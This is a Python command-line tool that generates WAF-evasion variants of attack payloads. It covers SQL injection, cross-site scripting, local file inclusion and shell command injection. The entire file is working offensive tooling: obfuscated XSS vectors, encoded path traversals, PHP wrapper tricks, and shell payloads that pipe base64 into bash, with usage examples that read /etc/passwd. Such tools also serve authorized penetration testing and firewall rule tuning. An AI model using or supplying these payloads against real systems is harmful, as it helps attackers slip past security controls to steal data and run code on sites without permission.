#!/usr/bin/env python3
"""
WAF Bypass Generator
Generate payloads to bypass Web Application Firewalls.

USAGE:
    python waf_bypass.py <payload> [--type sqli|xss|lfi|rce] [--waf cloudflare|modsecurity|aws]

EXAMPLES:
    python waf_bypass.py "' OR 1=1--" --type sqli
    python waf_bypass.py "<script>alert(1)</script>" --type xss
    python waf_bypass.py "/etc/passwd" --type lfi
    python waf_bypass.py "cat /etc/passwd" --type rce --waf cloudflare
"""

import sys
import argparse
import random
import re
sys.path.insert(0, '/home/l0ve/Desktop/WD/Tools')
from lib import success, error, warning, info, banner

# SQLi Bypass Techniques
SQLI_BYPASSES = {
    'comments': [
        lambda p: p.replace(' ', '/**/'),
        lambda p: p.replace(' ', '/*!*/'),
        lambda p: p.replace(' ', '/**_**/'),
        lambda p: re.sub(r'\bOR\b', '/**/OR/**/', p, flags=re.IGNORECASE),
        lambda p: re.sub(r'\bAND\b', '/**/AND/**/', p, flags=re.IGNORECASE),
        lambda p: re.sub(r'\bSELECT\b', '/**/SELECT/**/', p, flags=re.IGNORECASE),
        lambda p: re.sub(r'\bUNION\b', '/**/UNION/**/', p, flags=re.IGNORECASE),
    ],
    'case': [
        lambda p: ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)]),
        lambda p: p.upper(),
        lambda p: re.sub(r'\bselect\b', 'SeLeCt', p, flags=re.IGNORECASE),
        lambda p: re.sub(r'\bunion\b', 'UnIoN', p, flags=re.IGNORECASE),
        lambda p: re.sub(r'\bor\b', 'oR', p, flags=re.IGNORECASE),
    ],
    'encoding': [
        lambda p: p.replace("'", '%27'),
        lambda p: p.replace("'", '%2527'),  # Double URL encode
        lambda p: p.replace(' ', '%20'),
        lambda p: p.replace(' ', '+'),
        lambda p: p.replace(' ', '%09'),  # Tab
        lambda p: p.replace(' ', '%0a'),  # Newline
        lambda p: p.replace(' ', '%0d'),  # Carriage return
        lambda p: p.replace('=', '%3d'),
    ],
    'functions': [
        lambda p: re.sub(r'\bOR\b', '||', p, flags=re.IGNORECASE),
        lambda p: re.sub(r'\bAND\b', '&&', p, flags=re.IGNORECASE),
        lambda p: p.replace('1=1', '1<2'),
        lambda p: p.replace('1=1', '1 LIKE 1'),
        lambda p: p.replace('1=1', 'true'),
        lambda p: re.sub(r"'([^']*)'", r"CONCAT(CHAR(39),'\1',CHAR(39))", p),
    ],
    'null_bytes': [
        lambda p: p + '%00',
        lambda p: '%00' + p,
        lambda p: p.replace(' ', '%00'),
    ],
    'newlines': [
        lambda p: p.replace(' ', '\n'),
        lambda p: p.replace(' ', '\r\n'),
        lambda p: p.replace('--', '#'),
        lambda p: p.replace('--', '--+'),
        lambda p: p.replace('--', '-- -'),
    ],
}

# XSS Bypass Techniques
XSS_BYPASSES = {
    'tag_manipulation': [
        lambda p: p.replace('<script>', '<scr<script>ipt>'),
        lambda p: p.replace('<script>', '<SCRIPT>'),
        lambda p: p.replace('<script>', '<ScRiPt>'),
        lambda p: p.replace('<script>', '<script/x>'),
        lambda p: p.replace('<script>', '<script\t>'),
        lambda p: p.replace('<script>', '<script\n>'),
        lambda p: p.replace('<img', '<IMG'),
        lambda p: p.replace('<img', '<img/'),
        lambda p: p.replace('<svg', '<SVG'),
        lambda p: p.replace('<svg', '<svg/'),
    ],
    'event_handlers': [
        lambda p: p.replace('onerror=', 'ONERROR='),
        lambda p: p.replace('onerror=', 'onerror\t='),
        lambda p: p.replace('onerror=', 'onerror\n='),
        lambda p: p.replace('onload=', 'onload\t='),
        lambda p: p.replace('onclick=', 'onclick\n='),
    ],
    'encoding': [
        lambda p: re.sub(r'alert\((\d+)\)', r'alert`\1`', p),
        lambda p: p.replace('alert(1)', 'alert(String.fromCharCode(49))'),
        lambda p: p.replace('alert(1)', 'alert(/1/.source)'),
        lambda p: p.replace('alert', '\\u0061lert'),
        lambda p: p.replace('alert', 'al\\u0065rt'),
        lambda p: p.replace('(', '&#40;'),
        lambda p: p.replace(')', '&#41;'),
        lambda p: p.replace('<', '\\x3c'),
        lambda p: p.replace('>', '\\x3e'),
    ],
    'javascript_tricks': [
        lambda p: p.replace('javascript:', 'javascript\t:'),
        lambda p: p.replace('javascript:', 'java\nscript:'),
        lambda p: p.replace('javascript:', 'java\tscript:'),
        lambda p: p.replace('javascript:', 'javascript\x00:'),
        lambda p: p.replace('javascript:', '&#106;avascript:'),
        lambda p: p.replace('javascript:', '&#x6a;avascript:'),
    ],
    'alternative_tags': [
        lambda p: '<details open ontoggle=alert(1)>',
        lambda p: '<marquee onstart=alert(1)>',
        lambda p: '<video src=x onerror=alert(1)>',
        lambda p: '<audio src=x onerror=alert(1)>',
        lambda p: '<body onpageshow=alert(1)>',
        lambda p: '<input onfocus=alert(1) autofocus>',
        lambda p: '<select onfocus=alert(1) autofocus>',
        lambda p: '<textarea onfocus=alert(1) autofocus>',
        lambda p: '<keygen onfocus=alert(1) autofocus>',
        lambda p: '<object data="javascript:alert(1)">',
    ],
}

# LFI Bypass Techniques
LFI_BYPASSES = {
    'traversal': [
        lambda p: p.replace('../', '....//'),
        lambda p: p.replace('../', '..../'),
        lambda p: p.replace('../', '....\\\\'),
        lambda p: p.replace('../', '%2e%2e%2f'),
        lambda p: p.replace('../', '%2e%2e/'),
        lambda p: p.replace('../', '..%2f'),
        lambda p: p.replace('../', '%252e%252e%252f'),
        lambda p: p.replace('../', '..%c0%af'),
        lambda p: p.replace('../', '..%c1%9c'),
    ],
    'null_byte': [
        lambda p: p + '%00',
        lambda p: p + '%00.php',
        lambda p: p + '%00.html',
        lambda p: p + '\x00',
    ],
    'wrappers': [
        lambda p: f'php://filter/convert.base64-encode/resource={p}',
        lambda p: f'php://filter/read=string.rot13/resource={p}',
        lambda p: f'php://filter/convert.iconv.utf-8.utf-16/resource={p}',
        lambda p: f'file://{p}',
        lambda p: f'expect://{p}',
    ],
    'encoding': [
        lambda p: p.replace('/', '%2f'),
        lambda p: p.replace('/', '%252f'),
        lambda p: p.replace('/', '%c0%af'),
        lambda p: p.replace('.', '%2e'),
    ],
}

# RCE Bypass Techniques
RCE_BYPASSES = {
    'space': [
        lambda p: p.replace(' ', '${IFS}'),
        lambda p: p.replace(' ', '$IFS'),
        lambda p: p.replace(' ', '{IFS}'),
        lambda p: p.replace(' ', '%09'),
        lambda p: p.replace(' ', '%0a'),
        lambda p: p.replace(' ', '<'),
        lambda p: p.replace(' ', '$IFS$9'),
    ],
    'command': [
        lambda p: p.replace('cat', 'c\\at'),
        lambda p: p.replace('cat', 'c""at'),
        lambda p: p.replace('cat', "c''at"),
        lambda p: p.replace('cat', 'c`echo a`t'),
        lambda p: p.replace('cat', '/bin/cat'),
        lambda p: p.replace('cat', 'tac'),
        lambda p: p.replace('cat', 'nl'),
        lambda p: p.replace('cat', 'head'),
        lambda p: p.replace('cat', 'tail'),
        lambda p: p.replace('cat', 'less'),
        lambda p: p.replace('cat', 'more'),
        lambda p: re.sub(r'\bls\b', '/bin/l\\s', p),
        lambda p: re.sub(r'\bwhoami\b', 'who\\ami', p),
    ],
    'encoding': [
        lambda p: f"echo {__import__('base64').b64encode(p.encode()).decode()} | base64 -d | bash",
        lambda p: f"bash -c '{p}'",
        lambda p: f"sh -c '{p}'",
        lambda p: f"/bin/bash -c '{p}'",
    ],
    'quotes': [
        lambda p: p.replace("'", '"'),
        lambda p: p.replace('"', "'"),
        lambda p: p.replace("'", '$\'\\x27\''),
    ],
    'variables': [
        lambda p: re.sub(r'\b(\w+)\b', lambda m: ''.join([f"${{{c}}}" if c.isalpha() else c for c in m.group(1)]), p) if 'cat' in p or 'ls' in p else p,
    ],
}


class WAFBypass:
    def __init__(self):
        self.bypasses = {
            'sqli': SQLI_BYPASSES,
            'xss': XSS_BYPASSES,
            'lfi': LFI_BYPASSES,
            'rce': RCE_BYPASSES,
        }

    def generate(self, payload: str, payload_type: str, techniques: list = None) -> list:
        """Generate bypass variants."""
        results = []

        if payload_type not in self.bypasses:
            return [payload]

        type_bypasses = self.bypasses[payload_type]

        if techniques:
            selected = {k: v for k, v in type_bypasses.items() if k in techniques}
        else:
            selected = type_bypasses

        for technique, transforms in selected.items():
            for transform in transforms:
                try:
                    variant = transform(payload)
                    if variant and variant != payload and variant not in results:
                        results.append(variant)
                except:
                    continue

        return results

    def generate_all(self, payload: str) -> dict:
        """Generate bypasses for all types."""
        results = {}
        for payload_type in self.bypasses:
            results[payload_type] = self.generate(payload, payload_type)
        return results


def main():
    parser = argparse.ArgumentParser(
        description='WAF Bypass Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
    %(prog)s "' OR 1=1--" --type sqli
    %(prog)s "<script>alert(1)</script>" --type xss
    %(prog)s "/etc/passwd" --type lfi
    %(prog)s "cat /etc/passwd" --type rce
    %(prog)s "SELECT * FROM users" --type sqli --technique comments,case
        """
    )
    parser.add_argument('payload', help='Original payload')
    parser.add_argument('-t', '--type', choices=['sqli', 'xss', 'lfi', 'rce'], help='Payload type')
    parser.add_argument('--technique', help='Specific techniques (comma-separated)')
    parser.add_argument('--all', action='store_true', help='Generate for all types')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('--limit', type=int, default=50, help='Max variants per type (default: 50)')
    args = parser.parse_args()

    banner("WAF Bypass Generator")
    info(f"Original: {args.payload}")

    bypass = WAFBypass()

    if args.all:
        results = bypass.generate_all(args.payload)
        all_variants = []

        for ptype, variants in results.items():
            if variants:
                print(f"\n[{ptype.upper()}]")
                for v in variants[:args.limit]:
                    print(f"  {v}")
                    all_variants.append(v)

        if args.output:
            with open(args.output, 'w') as f:
                f.write('\n'.join(all_variants))
            success(f"Saved {len(all_variants)} variants to {args.output}")

    elif args.type:
        techniques = args.technique.split(',') if args.technique else None
        variants = bypass.generate(args.payload, args.type, techniques)

        print(f"\n[{args.type.upper()} Bypasses]")
        for v in variants[:args.limit]:
            print(f"  {v}")

        success(f"\nGenerated {len(variants)} variants")

        if args.output:
            with open(args.output, 'w') as f:
                f.write('\n'.join(variants))
            success(f"Saved to {args.output}")

    else:
        error("Specify --type or use --all")


if __name__ == '__main__':
    main()
